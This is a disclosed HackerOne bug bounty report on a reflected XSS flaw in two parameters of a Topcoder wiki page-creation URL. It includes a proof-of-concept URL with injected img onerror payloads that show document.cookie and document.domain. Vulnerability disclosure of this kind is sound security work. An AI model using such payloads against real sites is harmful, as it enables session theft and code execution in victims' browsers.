# Reflected XSS on https://apps.topcoder.com/wiki/pages/createpage.action

## Report Details
- **Report ID**: 866576
- **URL**: https://hackerone.com/reports/866576
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-05T16:10:56.380Z
- **Disclosed**: 2020-05-12T13:47:56.085Z

## Reporter
- **Username**: meryem0x
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: lab45

## Vulnerability Information
## Summary:
Hi :) A reflected XSS occurs on https://apps.topcoder.com/wiki/pages/createpage.action when creating wiki pages.

## Steps To Reproduce:
A user can create wiki pages on https://apps.topcoder.com/wiki/pages/createpage.action?spaceKey=tcwiki. In this url `parentPageString` and `labelsString` parameters are vulnerable to XSS.

PoC:
https://apps.topcoder.com/wiki/pages/createpage.action?spaceKey=tcwiki&parentPageString=powerpuff_hackerone%22%3E%3Cimg%20src=X%20onerror=alert(document.cookie)%3E&labelsString=%22%3E%3Cimg+src%3DX+onerror%3Dalert(document.domain)%3E
{F816308}
{F816309}

## Impact

XSS can use to steal cookies or to run arbitrary code on victim's browser.

## Attachments
- 2020-05-05_19-05-36_ekran_g_r_nt_s_.png
- 2020-05-05_19-05-32_ekran_g_r_nt_s_.png
